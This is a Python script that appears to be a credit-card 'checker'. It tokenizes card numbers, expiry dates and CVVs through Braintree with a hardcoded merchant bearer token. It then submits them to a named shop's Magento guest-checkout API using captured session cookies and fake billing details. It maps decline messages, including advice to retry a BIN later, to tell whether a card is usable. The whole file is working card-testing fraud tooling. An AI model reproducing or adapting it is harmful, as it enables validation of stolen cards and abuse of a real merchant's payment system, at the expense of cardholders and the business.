import requests
import time
def Tele(cx):
	cc = cx.split("|")[0]
	mes = cx.split("|")[1]
	ano = cx.split("|")[2]
	cvv = cx.split("|")[3]
	if "20" in ano:
		ano = ano.split("20")[1]
	headers = {
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjk4NTAwNjIsImp0aSI6IjUxZmQzNWQ5LTYxNTctNGFhNS1hY2U0LWJhOThiZThlZmM5MSIsInN1YiI6ImRodzU3bWhtd2ozbXpibjciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImRodzU3bWhtd2ozbXpibjciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.eNt49QolYrwrJ603lJzv8REl4dHp96S77FIXz7jqZyn0WYeKui1yO7AZ-iTSCqkthFAi3hyoM4COMd9OR8bQPQ',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'priority': 'u=1, i',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'c87c1aaa-3504-41c8-aded-2420886e6a6b',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': cc,
	                'expirationMonth': mes,
	                'expirationYear': ano,
	                'cvv': cvv,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	token=response.json()['data']['tokenizeCreditCard']['token']

	cookies = {
	    'PHPSESSID': '4t40a0n0102orgom7jh9dojtmnjh36lc',
	    'PHPSESSID': 'usun4pmeveb8ov0g6avqlt62cg6m287g',
	    'mage-messages': '',
	    'form_key': 'tFPEFfIaxqXw4IJ1',
	    '_ga_VS3FFF3K9S': 'deleted',
	    '__cf_bm': 'jQsrcrmQ9Td47O7cKvADUb7m_fZ82c7hIAAbE.YwkcE-1729763629-1.0.1.1-RylEXDFjNV2f6MUko1EibVDRnWbtmsUAsUIr1vsF9Oq_.9A9Z8NKFZdKbm_A6guvZ2KElBInExO2vJcTZEIxpA',
	    '_gid': 'GA1.2.176187819.1729763633',
	    'cf_clearance': 'z3Q7Ts8TI7o_XtFtWUqmPUqFgaCNZTHnyQ6liHioFEg-1729763634-1.2.1.1-kqU4twBLUV3HhG7fUkHYq43b3udGGHvfQLWLgffLdgCB31Sex8fLisIUCsMd3K1mu23lEga7N8c0btzylMCL6gMgGtVno7l8EW0.D.KC917_dfUwO8vihQ8OXgE03v3TQAmPfWPtqnaQKTrvesXIEgbpX4KYODuiysLDFJA1pjS_B9nifVV1bQQZRRtUKbb_wtiOspVD6mKIMkcBrJBy0b2n05S2pUZe5J3qYD4poTxh3dQHcp9_HQkdjS2MgZPjRmQbyfSv_Gd1S5jB8iG3cqvdg3Dli_1BLtbKr5Wy6josZHWInm_0NKmVoOyotp3OAJ2CdxG5i55zaX40VojK52H9YeBPc7OxRznx97nVxFyfp2e4JjsFo1QkvIiGeOXF',
	    'mage-cache-storage': '%7B%7D',
	    'mage-cache-storage-section-invalidation': '%7B%7D',
	    'mage-cache-sessid': 'true',
	    'recently_viewed_product': '%7B%7D',
	    'recently_viewed_product_previous': '%7B%7D',
	    'recently_compared_product': '%7B%7D',
	    'recently_compared_product_previous': '%7B%7D',
	    'product_data_storage': '%7B%7D',
	    '_ga_VS3FFF3K9S': 'GS1.1.1729763633.3.1.1729763663.30.0.0',
	    '_ga': 'GA1.2.546678352.1729346549',
	    'private_content_version': 'cfa428bd045a21868587a4e8f18cb350',
	    'section_data_ids': '%7B%22cart%22%3A1729763657%2C%22directory-data%22%3A1729763657%2C%22captcha%22%3A1729763637%2C%22messages%22%3A1729763712%7D',
	}
	
	headers = {
	    'Accept': '*/*',
	    'Accept-Language': 'en-US,en;q=0.9',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/json',
	    # 'Cookie': 'PHPSESSID=4t40a0n0102orgom7jh9dojtmnjh36lc; PHPSESSID=usun4pmeveb8ov0g6avqlt62cg6m287g; mage-messages=; form_key=tFPEFfIaxqXw4IJ1; _ga_VS3FFF3K9S=deleted; __cf_bm=jQsrcrmQ9Td47O7cKvADUb7m_fZ82c7hIAAbE.YwkcE-1729763629-1.0.1.1-RylEXDFjNV2f6MUko1EibVDRnWbtmsUAsUIr1vsF9Oq_.9A9Z8NKFZdKbm_A6guvZ2KElBInExO2vJcTZEIxpA; _gid=GA1.2.176187819.1729763633; cf_clearance=z3Q7Ts8TI7o_XtFtWUqmPUqFgaCNZTHnyQ6liHioFEg-1729763634-1.2.1.1-kqU4twBLUV3HhG7fUkHYq43b3udGGHvfQLWLgffLdgCB31Sex8fLisIUCsMd3K1mu23lEga7N8c0btzylMCL6gMgGtVno7l8EW0.D.KC917_dfUwO8vihQ8OXgE03v3TQAmPfWPtqnaQKTrvesXIEgbpX4KYODuiysLDFJA1pjS_B9nifVV1bQQZRRtUKbb_wtiOspVD6mKIMkcBrJBy0b2n05S2pUZe5J3qYD4poTxh3dQHcp9_HQkdjS2MgZPjRmQbyfSv_Gd1S5jB8iG3cqvdg3Dli_1BLtbKr5Wy6josZHWInm_0NKmVoOyotp3OAJ2CdxG5i55zaX40VojK52H9YeBPc7OxRznx97nVxFyfp2e4JjsFo1QkvIiGeOXF; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; _ga_VS3FFF3K9S=GS1.1.1729763633.3.1.1729763663.30.0.0; _ga=GA1.2.546678352.1729346549; private_content_version=cfa428bd045a21868587a4e8f18cb350; section_data_ids=%7B%22cart%22%3A1729763657%2C%22directory-data%22%3A1729763657%2C%22captcha%22%3A1729763637%2C%22messages%22%3A1729763712%7D',
	    'Origin': 'https://www.olystudio.com',
	    'Referer': 'https://www.olystudio.com/checkout/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
	    'X-Requested-With': 'XMLHttpRequest',
	    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	}
	
	json_data = {
	    'cartId': 'fhAzxKJigwr2gjXXpaFo5tXrjkLukkZ0',
	    'billingAddress': {
	        'countryId': 'US',
	        'regionId': '43',
	        'regionCode': 'NY',
	        'region': 'New York',
	        'street': [
	            'New York',
	        ],
	        'company': '',
	        'telephone': '5167778888',
	        'postcode': '10080',
	        'city': 'New York',
	        'firstname': 'shhshshd',
	        'lastname': 'hshdhdhd',
	        'saveInAddressBook': None,
	    },
	    'paymentMethod': {
	        'method': 'braintree',
	        'additional_data': {
	            'payment_method_nonce': token,
	            'device_data': '{"device_session_id":"c383b8f2a94e507581dc53f5af6ae68d","fraud_merchant_id":null,"correlation_id":"582dad09ea51d0fc6d4b286d8db53cdb"}',
	        },
	        'extension_attributes': {
	            'agreement_ids': [
	                '1',
	                '2',
	            ],
	        },
	    },
	    'email': 'jdhdhsbsgdh@gmail.com',
	}
	
	req0 = requests.post(
	    'https://www.olystudio.com/rest/default/V1/guest-carts/fhAzxKJigwr2gjXXpaFo5tXrjkLukkZ0/payment-information',
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	)
	if "Declined - Call Issuer" in req0.text:
		return "Declined - Call Issuer"
	if "Insufficient Funds" in req0.text:
		return "Insufficient Funds"
	if "Cannot Authorize at this time (Policy)" in req0.text:
		return "Cannot Authorize at this time (Policy)"
	if "Expired Card" in req0.text:
		return "Expired Card"
	if "Cardholder's Activity Limit Exceeded" in req0.text:
		return "Cardholder's Activity Limit Exceeded"
	if "Closed Card" in req0.text:
		return "Closed Card"
	if "Card Not Activated" in req0.text:
		return "Card Not Activated"
	if "risk" in req0.text:
		return "RISK: Retry this BIN later."
	if "Processor Declined - Fraud Suspected" in req0.text:
		return "Processor Declined - Fraud Suspected"
	if "No Account" in req0.text:
		return "No Account"
	if "Card Issuer Declined CVV" in req0.text:
		return "Card Issuer Declined CVV"
	if "Do Not Honor" in req0.text:
		return "Do Not Honor"
	if "Processor Declined" in req0.text:
		return "Processor Declined"
	if "Cannot Authorize at this time (Life cycle)" in req0.text:
		return "Cannot Authorize at this time (Life cycle)"
	if "Limit Exceeded" in req0.text:
		return "Limit Exceeded"
	if "Call Issuer. Pick Up Card" in req0.text:
		return "Call Issuer. Pick Up Card"
	else:
		try:
			code = req0.json()['error']
			return code
		except:
			try:
				return req0.json()['error']
			except:
				return req0.text
